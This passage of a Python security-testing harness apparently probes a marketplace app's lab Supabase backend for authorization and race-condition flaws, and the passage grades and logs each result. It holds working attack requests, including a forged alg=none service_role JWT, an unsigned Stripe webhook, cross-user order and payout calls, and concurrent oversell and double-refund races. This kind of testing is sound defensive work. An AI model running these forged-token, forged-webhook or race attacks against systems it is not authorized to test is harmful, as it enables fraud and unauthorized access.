                ("wrong_seller", {"buyer_id": buyer_id, "order_id": oid, "seller_id": buyer_id, "shipping_method": "hand"}),
            ):
                hdr = ANON if attack == "anon_checkout" else BH
                payload = body or {"buyer_id": buyer_id, "order_id": oid, "shipping_method": "hand"}
                ck = edge("create-payment-intent", hdr, payload)
                rec("CHECKOUT", attack, "anon" if attack.startswith("anon") else "buyer", f"http={ck['http']} {r_short(ck)}", "session authority", "INFO", ck)

            # Two sessions same order (race later too)
            ck1 = edge("create-payment-intent", BH, {"buyer_id": buyer_id, "order_id": oid, "shipping_method": "hand", "amount": 1})
            ck2 = edge("create-payment-intent", BH, {"buyer_id": buyer_id, "order_id": oid, "shipping_method": "hand", "amount": 1})
            rec("CHECKOUT", "two_sessions_same_order_seq", "buyer", f"a={ck1['http']} b={ck2['http']}", "double session", "INFO", {"a": ck1["text"][:400], "b": ck2["text"][:400]})

            # Bag duplicate line
            ck = edge(
                "create-payment-intent",
                BH,
                {
                    "buyer_id": buyer_id,
                    "order_id": oid,
                    "bag_checkout": True,
                    "shipping_method": "hand",
                    "bag_lines": [
                        {"order_id": oid, "product_id": p1_id, "seller_id": seller_id, "quantity": 1, "line_total_cents": 1},
                        {"order_id": oid, "product_id": p1_id, "seller_id": seller_id, "quantity": 1, "line_total_cents": 1},
                    ],
                },
            )
            rec("CHECKOUT", "bag_duplicate_same_order", "buyer", f"http={ck['http']} {r_short(ck)}", "double charge same unit", "INFO", ck)

            # Foreign order in bag
            other = rest("GET", f"orders?buyer_id=neq.{buyer_id}&select=id,buyer_id,seller_id&limit=1", SVC)
            other_id = None
            if isinstance(other["body"], list) and other["body"]:
                other_id = other["body"][0]["id"]
            if other_id:
                ck = edge(
                    "create-payment-intent",
                    BH,
                    {
                        "buyer_id": buyer_id,
                        "order_id": oid,
                        "bag_checkout": True,
                        "shipping_method": "hand",
                        "bag_lines": [{"order_id": other_id}],
                    },
                )
                rec("CHECKOUT", "bag_foreign_order", "buyer", f"http={ck['http']} {r_short(ck)}", "pay someone else's order", "P1" if ck["http"] < 300 else "INFO", ck, finding=ck["http"] < 300)

    # Extra product + order for multi-seller bag
    if p5_id:
        r = insert_order(BH, {"product_id": p5_id})
        o5 = first_row(r["body"])
        o5id = (o5 or {}).get("id")
        if oid and o5id:
            ck = edge(
                "create-payment-intent",
                BH,
                {
                    "buyer_id": buyer_id,
                    "order_id": oid,
                    "bag_checkout": True,
                    "shipping_method": "hand",
                    "bag_lines": [{"order_id": oid}, {"order_id": o5id}],
                },
            )
            rec("CHECKOUT", "bag_two_products_same_seller", "buyer", f"http={ck['http']} {r_short(ck)}", "bag quote", "INFO", ck)

    # GET settle unauth
    r = edge("create-payment-intent", ANON, None, qs="checkout_return=success&session_id=cs_test_fake", method="GET")
    rec("WEBHOOK/RETURN", "settle_get_fake_session_anon", "anon", f"http={r['http']} {r_short(r)}", "unauth settle", "INFO", r)
    r = edge("create-payment-intent", BH, {"order_id": str(uuid.uuid4()), "payment_intent_id": "pi_x"}, qs="fase2_e2e_settle=1")
    rec("EDGE", "fase2_e2e_settle_as_buyer_jwt", "buyer", f"http={r['http']} {r_short(r)}", "e2e settle bypass", "P0" if r["http"] == 200 else "INFO", r, finding=r["http"] == 200)

    # Stripe webhook unsigned
    r = http(
        "POST",
        f"{url}/functions/v1/stripe-webhook",
        {"apikey": anon, "Content-Type": "application/json", "stripe-signature": "t=1,v1=deadbeef"},
        {"type": "checkout.session.completed", "data": {"object": {"id": "cs_test_x", "payment_status": "paid"}}},
    )
    rec("WEBHOOK", "unsigned_or_garbage_signature", "anon", f"http={r['http']} {r_short(r)}", "forged webhook", "P0" if r["http"] == 200 else "INFO", r, finding=r["http"] == 200)

    # refund-order
    if oid:
        r = edge("refund-order", BH, {"order_id": oid})
        rec("REFUNDS", "buyer_refund_own_order", "buyer", f"http={r['http']} {r_short(r)}", "buyer refund", "P1" if r["http"] == 200 and "Sem permissão" not in (r.get("text") or "") else "INFO", r)
        r = edge("refund-order", SH, {"order_id": oid})
        rec("REFUNDS", "seller_refund_unpaid_order", "seller", f"http={r['http']} {r_short(r)}", "refund unpaid", "INFO", r)
        r = edge("refund-order", ANON, {"order_id": oid})
        rec("REFUNDS", "anon_refund", "anon", f"http={r['http']}", "anon refund", "INFO", r)

    # payout
    r = edge("create-connect-account", BH, {"amount": 50000, "idempotency_key": "rtblindpay" + uuid.uuid4().hex[:10]})
    rec("PAYOUT", "buyer_payout_50eur", "buyer", f"http={r['http']} {r_short(r)}", "payout without funds", "INFO", r)
    r = edge("create-connect-account", SH, {"amount": 1.5, "idempotency_key": "rtblindpay" + uuid.uuid4().hex[:10]})
    rec("PAYOUT", "seller_payout_non_integer_cents", "seller", f"http={r['http']} {r_short(r)}", "float cents", "INFO", r)
    r = edge("create-connect-account", SH, {"amount": 100, "idempotency_key": "short"})
    rec("PAYOUT", "payout_short_idempotency", "seller", f"http={r['http']} {r_short(r)}", "idempotency", "INFO", r)
    r = edge("create-connect-account", BH, {"user_id": seller_id})
    rec("PAYOUT", "buyer_onboard_as_seller_user_id", "buyer", f"http={r['http']} {r_short(r)}", "identity swap", "INFO", r)

    # tip checkout
    r = edge("create-live-tip-checkout", BH, {"seller_id": seller_id, "amount_eur": 0.01, "live_id": None})
    rec("TIPS", "tip_checkout_below_min", "buyer", f"http={r['http']} {r_short(r)}", "underpay tip", "INFO", r)
    r = edge("create-live-tip-checkout", BH, {"seller_id": seller_id, "amount_eur": 500, "tip_id": str(uuid.uuid4())})
    rec("TIPS", "tip_checkout_client_tip_id", "buyer", f"http={r['http']} {r_short(r)}", "bind existing tip", "INFO", r)
    r = edge("create-live-tip-checkout", BH, {"seller_id": buyer_id, "amount_eur": 5})
    rec("TIPS", "tip_self", "buyer", f"http={r['http']} {r_short(r)}", "self tip mint?", "INFO", r)
    r = edge("create-live-tip-checkout", ANON, {"seller_id": seller_id, "amount_eur": 5})
    rec("TIPS", "tip_anon", "anon", f"http={r['http']}", "anon tip", "INFO", r)

    # mux / livekit
    r = edge("create-mux-live", BH, {"title": "rt-blind-as-buyer"})
    rec("LIVE/MUX", "buyer_create_mux_live", "buyer", f"http={r['http']} {r_short(r)}", "buyer as broadcaster", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)
    r = edge("create-mux-live", SH, {"title": f"rt-blind-seller {stamp}"})
    rec("LIVE/MUX", "seller_create_mux_live", "seller", f"http={r['http']} {r_short(r)}", "control", "INFO", r)
    r = edge("complete-mux-live", BH, {"live_id": str(uuid.uuid4())})
    rec("LIVE/MUX", "buyer_complete_random_live", "buyer", f"http={r['http']} {r_short(r)}", "cross live", "INFO", r)
    r = edge("livekit-mux-publish", BH, {"step": "token", "live_id": str(uuid.uuid4())})
    rec("LIVEKIT", "buyer_livekit_token_random", "buyer", f"http={r['http']} {r_short(r)}", "cross livekit", "INFO", r)
    r = edge("livekit-egress-cleanup", ANON, {})
    rec("LIVEKIT", "anon_egress_cleanup", "anon", f"http={r['http']} {r_short(r)}", "cleanup without secret", "P1" if r["http"] == 200 else "INFO", r, finding=r["http"] == 200)
    r = edge("resolve-mux-playback", ANON, {"live_id": str(uuid.uuid4())})
    rec("LIVE/MUX", "anon_resolve_playback_random", "anon", f"http={r['http']} {r_short(r)}", "info leak", "INFO", r)

    # PS / OCR
    r = edge("ingest-ocr-reservation", ANON, {"live_id": str(uuid.uuid4()), "ocr_line_hash": "abcdefghijkl", "requested_qty": 99})
    rec("PS/OCR", "ocr_no_device_token", "anon", f"http={r['http']} {r_short(r)}", "ocr without token", "INFO", r)
    r = edge("ingest-ocr-reservation", BH, {"live_id": str(uuid.uuid4()), "ocr_line_hash": "abcdefghijkl", "requested_qty": 99})
    rec("PS/OCR", "ocr_buyer_jwt_no_device_token", "buyer", f"http={r['http']} {r_short(r)}", "ocr jwt", "INFO", r)
    r = edge("ps-pairing-claim", ANON, {"code": "000000", "device_id": "rt-blind", "app_version": "1"})
    rec("PS/OCR", "pairing_000000", "anon", f"http={r['http']} {r_short(r)}", "pairing brute", "INFO", r)
    r = edge("ps-heartbeat", ANON, {"live_id": str(uuid.uuid4()), "device_id": "x", "status": "ok"})
    rec("PS/OCR", "heartbeat_no_token", "anon", f"http={r['http']} {r_short(r)}", "heartbeat", "INFO", r)
    r = rpc("batata_create_seller_device_token", {"p_device_id": "rt-blind-dev", "p_label": "rt"}, BH)
    rec("PS/OCR", "buyer_create_device_token", "buyer", f"http={r['http']} {r_short(r)}", "stolen OCR identity", "P1" if r["http"] == 200 and isinstance(r["body"], dict) and r["body"].get("ok") else "INFO", r, finding=bool(r["http"] == 200 and isinstance(r["body"], dict) and r["body"].get("ok")))
    r = rpc("batata_create_seller_device_token", {"p_device_id": "rt-blind-dev", "p_label": "rt"}, SH)
    rec("PS/OCR", "seller_create_device_token", "seller", f"http={r['http']} {r_short(r)}", "control", "INFO", r)

    # raffle tick
    raff = rest("GET", "live_raffles?select=id,status,seller_id,live_id&limit=3", SVC)
    raff_id = None
    if isinstance(raff["body"], list) and raff["body"]:
        raff_id = raff["body"][0].get("id")
    if raff_id:
        r = rpc("batata_tick_live_raffle", {"p_raffle_id": raff_id}, BH)
        rec("RAFFLES", "buyer_tick_raffle", "buyer", f"http={r['http']} {r_short(r)}", "close raffle", "P1" if r["http"] == 200 and isinstance(r["body"], dict) and r["body"].get("ok") else "INFO", r)
        r = rpc("batata_tick_live_raffle", {"p_raffle_id": raff_id}, SH)
        rec("RAFFLES", "seller_tick_raffle", "seller", f"http={r['http']} {r_short(r)}", "control", "INFO", r)
        # winner insert
        r = rest("POST", "live_raffle_winners", BH, {"raffle_id": raff_id, "user_id": buyer_id, "winner_id": buyer_id})
        rec("RAFFLES", "buyer_insert_winner", "buyer", f"http={r['http']} {r_short(r)}", "forge winner", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

    # reviews
    r = rest("POST", "reviews", BH, {"order_id": str(uuid.uuid4()), "rating": 5, "comment": "x", "author_role": "comprador"})
    rec("REVIEWS", "review_random_order", "buyer", f"http={r['http']} {r_short(r)}", "forged review", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)
    paid_orders = rest("GET", f"orders?buyer_id=eq.{buyer_id}&status=in.(concluido,entregue)&select=id,status,amount_paid_cents,payment_method&limit=5", SVC)
    rec("REVIEWS", "observe_reviewable_orders", "service_role", f"n={len(paid_orders['body']) if isinstance(paid_orders['body'], list) else 0}", "observe", "INFO", paid_orders["body"] if isinstance(paid_orders["body"], list) else r_short(paid_orders))
    if isinstance(paid_orders["body"], list) and paid_orders["body"]:
        rid = paid_orders["body"][0]["id"]
        r1 = rest("POST", "reviews", BH, {"order_id": rid, "rating": 5, "comment": f"rt-dup-a {stamp}", "author_role": "vendedor"})
        r2 = rest("POST", "reviews", BH, {"order_id": rid, "rating": 1, "comment": f"rt-dup-b {stamp}", "author_role": "vendedor"})
        rec("REVIEWS", "duplicate_review_same_order", "buyer", f"a={r1['http']} b={r2['http']} a_body={r_short(r1)} b_body={r_short(r2)}", "dup + role forge", "P1" if r1["http"] < 300 and r2["http"] < 300 else "INFO", {"a": r1, "b": r2}, finding=r1["http"] < 300 and r2["http"] < 300)

    # disputes
    r = rest("POST", "order_disputes", BH, {"order_id": str(uuid.uuid4()), "buyer_id": buyer_id, "seller_id": seller_id, "status": "aberta", "reason": "rt"})
    rec("DISPUTES", "dispute_random_order", "buyer", f"http={r['http']} {r_short(r)}", "forge dispute", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)
    if oid:
        r = rest("POST", "order_disputes", BH, {"order_id": oid, "buyer_id": buyer_id, "seller_id": seller_id, "status": "aberta", "reason": "rt-unpaid"})
        rec("DISPUTES", "dispute_unpaid_own_order", "buyer", f"http={r['http']} {r_short(r)}", "dispute unpaid", "INFO", r)
        r = rpc("batata_process_partial_refund_dispute", {"p_order_id": oid, "p_amount_cents": 1}, BH)
        rec("REFUNDS", "partial_refund_unpaid", "buyer", f"http={r['http']} {r_short(r)}", "partial without capture", "INFO", r)

    # offers
    if p1_id:
        r = rest(
            "POST",
            "product_offers",
            BH,
            {
                "product_id": p1_id,
                "buyer_id": buyer_id,
                "seller_id": seller_id,
                "amount": 0.5,
                "status": "accepted",
                "offered_by": "buyer",
                "responded_at": datetime.now(timezone.utc).isoformat(),
            },
        )
        row = first_row(r["body"])
        rec(
            "OFFERS",
            "buyer_insert_accepted_offer",
            "buyer",
            f"http={r['http']} status={None if not row else row.get('status')} amount={None if not row else row.get('amount')}",
            "self-accept offer",
            "P1" if row and str(row.get("status")) == "accepted" else "INFO",
            r,
            finding=bool(row and str(row.get("status")) == "accepted"),
        )
        offer_id = (row or {}).get("id")
        if offer_id:
            r = rest("PATCH", f"product_offers?id=eq.{offer_id}", BH, {"status": "accepted", "amount": 0.5})
            rec("OFFERS", "buyer_self_accept_pending", "buyer", f"http={r['http']} {r_short(r)}", "self accept", "INFO", r)
            r = rest("PATCH", f"product_offers?id=eq.{offer_id}", SH, {"status": "accepted"})
            after = rest("GET", f"product_offers?id=eq.{offer_id}&select=*", SVC)
            rec("OFFERS", "seller_accept_buyer_offer", "seller", f"http={r['http']} after={after['body']}", "control accept", "INFO", {"patch": r, "after": after["body"]})
            # two orders same offer
            o1 = insert_order(BH, {"product_id": p1_id, "product_offer_id": offer_id, "price_total": 0.5})
            o2 = insert_order(BH, {"product_id": p1_id, "product_offer_id": offer_id, "price_total": 0.5})
            rec(
                "OFFERS",
                "reuse_accepted_offer_two_orders",
                "buyer",
                f"a={o1['http']} b={o2['http']} a_c={None if not first_row(o1['body']) else first_row(o1['body']).get('contract_unit_cents')} b_txt={r_short(o2)}",
                "offer oneshot",
                "P1" if o1["http"] < 300 and o2["http"] < 300 else "INFO",
                {"a": o1, "b": o2},
                finding=o1["http"] < 300 and o2["http"] < 300,
            )

    # reservations
    lives = rest("GET", f"lives?seller_id=eq.{seller_id}&select=id,status,seller_id&limit=3", SVC)
    live_id = None
    if isinstance(lives["body"], list) and lives["body"]:
        live_id = lives["body"][0]["id"]
    li = None
    if live_id:
        lir = rest("GET", f"live_items?live_id=eq.{live_id}&select=id,price,quantity,product_id&limit=3", SVC)
        if isinstance(lir["body"], list) and lir["body"]:
            li = lir["body"][0]
    if live_id and li:
        r = rest(
            "POST",
            "live_reservation_requests",
            BH,
            {
                "live_id": live_id,
                "live_item_id": li["id"],
                "buyer_id": buyer_id,
                "seller_id": seller_id,
                "requested_qty": 1,
                "status": "accepted",
            },
        )
        row = first_row(r["body"])
        rec(
            "LIVE RESERVATIONS",
            "buyer_insert_accepted_reservation",
            "buyer",
            f"http={r['http']} status={None if not row else row.get('status')}",
            "self-accept reservation",
            "P1" if row and str(row.get("status")) == "accepted" else "INFO",
            r,
            finding=bool(row and str(row.get("status")) == "accepted"),
        )
        r = rpc(
            "batata_process_live_reservation_request",
            {
                "p_live_id": live_id,
                "p_live_item_id": li["id"],
                "p_buyer_id": buyer_id,
                "p_requested_qty": 1,
                "p_action": "accept",
            },
            BH,
        )
        rec("LIVE RESERVATIONS", "buyer_rpc_process_accept", "buyer", f"http={r['http']} {r_short(r)}", "self process", "INFO", r)

    # chats / storage
    r = rest("GET", "chats?select=id,user_a,user_b,product_id&limit=20", BH)
    rec("CHAT", "buyer_list_chats", "buyer", f"http={r['http']} n={len(r['body']) if isinstance(r['body'], list) else 'na'}", "scope", "INFO", {"n": len(r["body"]) if isinstance(r["body"], list) else None})
    if isinstance(r["body"], list):
        foreign = [c for c in r["body"] if buyer_id not in (c.get("user_a"), c.get("user_b"))]
        rec("CHAT", "buyer_sees_foreign_chats", "buyer", f"n_foreign={len(foreign)}", "cross chat", "P1" if foreign else "INFO", foreign[:3], finding=bool(foreign))
        if r["body"]:
            cid = r["body"][0]["id"]
            msgs = rest("GET", f"chat_messages?chat_id=eq.{cid}&select=*&limit=5", BH)
            rec("CHAT", "buyer_read_messages", "buyer", f"http={msgs['http']} n={len(msgs['body']) if isinstance(msgs['body'], list) else 0}", "messages", "INFO", {"http": msgs["http"]})

    # storage list
    for bucket in ("chat_media", "fleaber_private"):
        r = http(
            "POST",
            f"{url}/storage/v1/object/list/{bucket}",
            BH,
            {"prefix": "", "limit": 10},
        )
        rec("STORAGE", f"buyer_list_{bucket}", "buyer", f"http={r['http']} {r_short(r)}", "object leak", "INFO", r)
        r = http(
            "POST",
            f"{url}/storage/v1/object/list/{bucket}",
            BH,
            {"prefix": f"chat_uploads/{seller_id}/", "limit": 10},
        )
        rec("STORAGE", f"buyer_list_seller_prefix_{bucket}", "buyer", f"http={r['http']} {r_short(r)}", "cross storage", "P1" if r["http"] == 200 and isinstance(r["body"], list) and r["body"] else "INFO", r, finding=bool(r["http"] == 200 and isinstance(r["body"], list) and r["body"]))

    r = http("GET", f"{url}/storage/v1/object/public/chat_media/does-not-exist", ANON)
    rec("STORAGE", "anon_public_chat_media_missing", "anon", f"http={r['http']}", "public bucket", "INFO", {"http": r["http"]})

    # delete-test-account / e2e oversell
    r = edge("delete-test-account", BH, {"confirm": "APAGAR TUDO"})
    rec("AUTH", "delete_test_account_as_lab_buyer", "buyer", f"http={r['http']} {r_short(r)}", "nuke", "INFO", r)
    r = edge("sec-fase2-e2e-oversell", BH, {"probe": "setup_paid_bag", "buyer_id": buyer_id, "seller_id": seller_id})
    rec("EDGE", "e2e_oversell_as_buyer_jwt", "buyer", f"http={r['http']} {r_short(r)}", "harness as user", "P0" if r["http"] == 200 else "INFO", r, finding=r["http"] == 200)

    # products: buyer update others
    if p1_id:
        r = rest("PATCH", f"products?id=eq.{p1_id}", BH, {"price": 0.01, "quantity": 999})
        after = rest("GET", f"products?id=eq.{p1_id}&select=id,price,quantity,seller_id", SVC)
        rec("CATALOG", "buyer_patch_seller_product", "buyer", f"http={r['http']} after={after['body']}", "catalog hijack", "P1" if r["http"] < 300 else "INFO", {"patch": r, "after": after["body"]}, finding=r["http"] < 300)
        r = rest("POST", "products", BH, {"seller_id": seller_id, "title": "stolen listing", "price": 1, "quantity": 1})
        rec("CATALOG", "buyer_insert_product_as_seller", "buyer", f"http={r['http']} {r_short(r)}", "listing theft", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

    # notifications
    r = rest("GET", "notifications_view?select=*&limit=5", BH)
    rec("PRIVACY", "notifications_view_buyer", "buyer", f"http={r['http']} n={len(r['body']) if isinstance(r['body'], list) else 'na'}", "notifs", "INFO", {"http": r["http"]})
    r = rest("GET", "notifications_view?select=*&limit=5", ANON)
    rec("PRIVACY", "notifications_view_anon", "anon", f"http={r['http']} {r_short(r)}", "anon notifs", "P2" if r["http"] == 200 and r["body"] else "INFO", r)

    # staff
    r = rest("POST", "seller_staff", BH, {"seller_id": seller_id, "user_id": buyer_id, "can_manage_raffles": True, "can_manage_reservations": True})
    rec("AUTHORITY", "buyer_insert_staff_on_seller", "buyer", f"http={r['http']} {r_short(r)}", "staff priv", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

    # alg=none
    fake_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIiLCJyb2xlIjoic2VydmljZV9yb2xlIiwiaXNzIjoic3VwYWJhc2UiLCJyZWYiOiJmeGRrbnpycWplbnpxY3Zud3FxcSJ9."
    r = rest("GET", "wallets?select=*&limit=3", {"apikey": anon, "Authorization": f"Bearer {fake_jwt}", "Content-Type": "application/json"})
    rec("AUTH", "alg_none_service_role_wallets", "forged", f"http={r['http']} {r_short(r)}", "auth bypass", "P0" if r["http"] == 200 and isinstance(r["body"], list) and r["body"] else "INFO", r, finding=bool(r["http"] == 200 and isinstance(r["body"], list) and r["body"]))

    # follows / favorites other
    r = rest("POST", "favorites", BH, {"user_id": seller_id, "product_id": p1_id})
    rec("PRIVACY", "favorite_as_other_user", "buyer", f"http={r['http']} {r_short(r)}", "identity", "INFO", r)
    r = rest("POST", "follows", BH, {"follower_id": seller_id, "following_id": buyer_id})
    rec("PRIVACY", "follow_as_other", "buyer", f"http={r['http']} {r_short(r)}", "identity", "INFO", r)

    # live messages
    r = rest("GET", "live_messages?select=*&limit=10", BH)
    rec("LIVE", "buyer_select_live_messages", "buyer", f"http={r['http']} n={len(r['body']) if isinstance(r['body'], list) else 'na'}", "scope", "INFO", {"http": r["http"], "n": len(r["body"]) if isinstance(r["body"], list) else None})

    # =====================================================================
    # PASS 2 — variants on interesting surfaces
    # =====================================================================
    # payment_method aliases for seller→pago on platform
    if p5_id:
        for pm in (
            "stripe",
            "Stripe",
            "pagamento na app",
            "Seguro Fleaber",
            "  seguro fleaber  ",
            "mbway",
            "MB-WAY",
            "pagamento directo",
            "direto",
            "",
            None,
        ):
            body = {
                "buyer_id": buyer_id,
                "seller_id": seller_id,
                "product_id": p5_id,
                "status": "reserva_pendente",
                "quantity": 1,
                "shipping_method": "hand",
            }
            if pm is not None:
                body["payment_method"] = pm
            ins = rest("POST", "orders", BH, body)
            row = first_row(ins["body"])
            oid2 = (row or {}).get("id")
            st_after = None
            if oid2:
                p = rest("PATCH", f"orders?id=eq.{oid2}", SH, {"status": "pago"})
                after = rest("GET", f"orders?id=eq.{oid2}&select=id,status,payment_method,amount_paid_cents", SVC)
                if isinstance(after["body"], list) and after["body"]:
                    st_after = after["body"][0].get("status")
                rec(
                    "ORDER FSM",
                    f"seller_pago_pm={pm!r}",
                    "seller",
                    f"insert={ins['http']} status={st_after} paid={None if not after['body'] else (after['body'][0].get('amount_paid_cents') if isinstance(after['body'], list) else None)}",
                    "payment method alias",
                    "P1" if st_after == "pago" and (pm is None or (isinstance(pm, str) and "mb" not in pm.lower() and "diret" not in pm.lower() and "direct" not in pm.lower() and pm.strip() != "")) else "INFO",
                    {"insert": ins["http"], "pm": pm, "after": after.get("body") if oid2 else ins},
                    finding=bool(st_after == "pago" and pm is not None and "mb" not in str(pm).lower() and "diret" not in str(pm).lower() and "direct" not in str(pm).lower() and str(pm).strip() != ""),
                )

    # checkout shipping variants
    if oid:
        for sm in ("HAND", "Hand ", "entrega em mão (€0.00)", "carrier", "CTT", "free", "0", "€0"):
            ck = edge("create-payment-intent", BH, {"buyer_id": buyer_id, "order_id": oid, "shipping_method": sm})
            rec("CHECKOUT", f"shipping_method={sm!r}", "buyer", f"http={ck['http']} {r_short(ck)}", "shipping authority", "INFO", {"http": ck["http"], "text": ck["text"][:220]})

    # GET settle of a real session if we created one
    # parse last successful checkout for session id
    session_ids: list[str] = []
    for row in RESULTS:
        if row["surface"] == "CHECKOUT" and isinstance(row.get("evidence"), dict):
            ev = row["evidence"]
            body = ev.get("body") if isinstance(ev, dict) else None
            if isinstance(body, dict):
                for k in ("session_id", "sessionId", "id"):
                    v = body.get(k) or (body.get("session") or {}).get("id") if isinstance(body.get("session"), dict) else None
                    if isinstance(v, str) and v.startswith("cs_"):
                        session_ids.append(v)
                url_s = body.get("url") or body.get("checkout_url")
                if isinstance(url_s, str) and "cs_test" in url_s:
                    session_ids.append(url_s)

    (OUT_DIR / "checkout_sessions_raw.json").write_text(
        json.dumps([r for r in RESULTS if row_is_checkout(r)], indent=2, default=str)[:200000],
        encoding="utf-8",
    )

    # =====================================================================
    # PASS 3 — races
    # =====================================================================
    # stock=1 two buyer orders
    if p1_id:
        rest("PATCH", f"products?id=eq.{p1_id}", SVC, {"quantity": 1, "price": 12.5, "is_sold": False})
        def make_order() -> dict[str, Any]:
            return insert_order(BH, {"product_id": p1_id, "quantity": 1})

        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = [ex.submit(make_order) for _ in range(10)]
            race_orders = [f.result() for f in as_completed(futs)]
        ok_ids = []
        for rr in race_orders:
            row = first_row(rr["body"])
            if rr["http"] < 300 and row and row.get("id"):
                ok_ids.append(row["id"])
        prod_after = rest("GET", f"products?id=eq.{p1_id}&select=id,quantity,is_sold", SVC)
        rec(
            "STOCK",
            "race_10x_insert_orders_stock1",
            "buyer",
            f"accepted={len(ok_ids)} product={prod_after['body']}",
            "two valid reservations of last unit",
            "P1" if len(ok_ids) >= 2 else "INFO",
            {"accepted": len(ok_ids), "ids": ok_ids, "product": prod_after["body"]},
            finding=len(ok_ids) >= 2,
        )

        # two checkout sessions concurrent on two accepted orders if any
        if len(ok_ids) >= 2:
            def ck_job(order_id: str) -> dict[str, Any]:
                return edge("create-payment-intent", BH, {"buyer_id": buyer_id, "order_id": order_id, "shipping_method": "hand"})

            with ThreadPoolExecutor(max_workers=2) as ex:
                a = ex.submit(ck_job, ok_ids[0])
                b = ex.submit(ck_job, ok_ids[1])
                ra, rb = a.result(), b.result()
            rec(
                "STOCK",
                "race_two_checkout_sessions_stock1",
                "buyer",
                f"a={ra['http']} b={rb['http']} a_txt={r_short(ra)} b_txt={r_short(rb)}",
                "two sessions last unit",
                "INFO",
                {"a": ra["text"][:500], "b": rb["text"][:500], "order_a": ok_ids[0], "order_b": ok_ids[1]},
            )
            (OUT_DIR / "race_two_sessions.json").write_text(
                json.dumps({"a": ra, "b": rb, "orders": ok_ids[:2]}, default=str)[:50000],
                encoding="utf-8",
            )

        # same order 10x checkout
        if ok_ids:
            target = ok_ids[0]
            with ThreadPoolExecutor(max_workers=8) as ex:
                futs = [ex.submit(lambda: edge("create-payment-intent", BH, {"buyer_id": buyer_id, "order_id": target, "shipping_method": "hand"})) for _ in range(8)]
                cks = [f.result() for f in as_completed(futs)]
            n200 = sum(1 for x in cks if x["http"] < 300)
            rec("CHECKOUT", "race_8x_checkout_same_order", "buyer", f"http200={n200}/8", "multi session", "INFO", [{"http": x["http"], "text": x["text"][:180]} for x in cks])

    # two reviews race
    if isinstance(paid_orders["body"], list) and paid_orders["body"]:
        rid = paid_orders["body"][0]["id"]
        def rev() -> dict[str, Any]:
            return rest("POST", "reviews", BH, {"order_id": rid, "rating": 5, "comment": f"race {uuid.uuid4()}", "author_role": "comprador"})
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs = [ex.submit(rev) for _ in range(6)]
            revs = [f.result() for f in as_completed(futs)]
        n_ok = sum(1 for x in revs if x["http"] < 300)
        rec("REVIEWS", "race_6x_review_same_order", "buyer", f"ok={n_ok}/6", "dup reviews", "P1" if n_ok >= 2 else "INFO", [{"http": x["http"], "text": x["text"][:160]} for x in revs], finding=n_ok >= 2)

    # two payouts
    key1 = "rtblindP3a" + uuid.uuid4().hex[:10]
    key2 = "rtblindP3b" + uuid.uuid4().hex[:10]
    def pay(key: str) -> dict[str, Any]:
        return edge("create-connect-account", SH, {"amount": 100, "idempotency_key": key})
    with ThreadPoolExecutor(max_workers=4) as ex:
        futs = [ex.submit(pay, key1) for _ in range(4)]
        same = [f.result() for f in as_completed(futs)]
    rec("PAYOUT", "race_4x_same_idempotency", "seller", f"https={[x['http'] for x in same]}", "dup transfer same key", "INFO", [{"http": x["http"], "text": x["text"][:200]} for x in same])
    with ThreadPoolExecutor(max_workers=2) as ex:
        a = ex.submit(pay, key1)
        b = ex.submit(pay, key2)
        pa, pb = a.result(), b.result()
    rec("PAYOUT", "race_two_keys_same_amount", "seller", f"a={pa['http']} b={pb['http']} {r_short(pa)} | {r_short(pb)}", "two intentions", "INFO", {"a": pa["text"][:300], "b": pb["text"][:300]})

    # reservation race last unit
    if live_id and li:
        def resv() -> dict[str, Any]:
            return rest(
                "POST",
                "live_reservation_requests",
                BH,
                {
                    "live_id": live_id,
                    "live_item_id": li["id"],
                    "buyer_id": buyer_id,
                    "seller_id": seller_id,
                    "requested_qty": 99,
                    "status": "pending",
                },
            )
        with ThreadPoolExecutor(max_workers=8) as ex:
            futs = [ex.submit(resv) for _ in range(8)]
            rs = [f.result() for f in as_completed(futs)]
        n_ok = sum(1 for x in rs if x["http"] < 300)
        rec("LIVE RESERVATIONS", "race_8x_qty99_reservation", "buyer", f"ok={n_ok}/8", "capacity", "INFO", [{"http": x["http"], "text": x["text"][:140]} for x in rs])

    # refund race (unpaid likely)
    if oid:
        def ref() -> dict[str, Any]:
            return edge("refund-order", SH, {"order_id": oid})
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = [ex.submit(ref) for _ in range(4)]
            refs = [f.result() for f in as_completed(futs)]
            rec("REFUNDS", "race_4x_refund_order", "seller", f"https={[x['http'] for x in refs]}", "dup refund", "INFO", [{"http": x["http"], "text": x["text"][:180]} for x in refs])

    # observe wallets after all
    wb = rest("GET", f"wallets?id=eq.{buyer_id}&select=id,balance", SVC)
    ws = rest("GET", f"wallets?id=eq.{seller_id}&select=id,balance", SVC)
    wd = rest("GET", f"wallets?id=eq.{disp_id}&select=id,balance", SVC) if disp_id else {"body": None}
    rec("WALLET", "observe_final_balances", "service_role", f"buyer={wb['body']} seller={ws['body']} disp={wd['body']}", "observe", "INFO", {"buyer": wb["body"], "seller": ws["body"], "disp": wd["body"]})

    # cleanup disposable auth user
    if disp_id:
        http("DELETE", f"{url}/auth/v1/admin/users/{disp_id}", SVC)
        rec("AUTH", "cleanup_disposable_user", "service_role", "done", "cleanup", "INFO", {"id": disp_id})

    # persist
    out_json = OUT_DIR / f"results_{STAMP}.json"
    payload = {
        "FROZEN_AT": datetime.now(timezone.utc).isoformat(),
        "run_id": RUN_ID,
        "project": "fxdknzrqjenzqcvnwqqq",
        "production_touched": False,
        "fase4": False,
        "results": RESULTS,
        "findings": [x for x in RESULTS if x.get("finding")],
    }
    out_json.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
    print(f"\nWrote {out_json} findings={len(payload['findings'])} rows={len(RESULTS)}")
    return 0


def row_is_checkout(r: dict[str, Any]) -> bool:
    return r.get("surface") == "CHECKOUT"


def xlist(xs: list[Any]) -> list[Any]:
    return xs


if __name__ == "__main__":
    sys.exit(main())
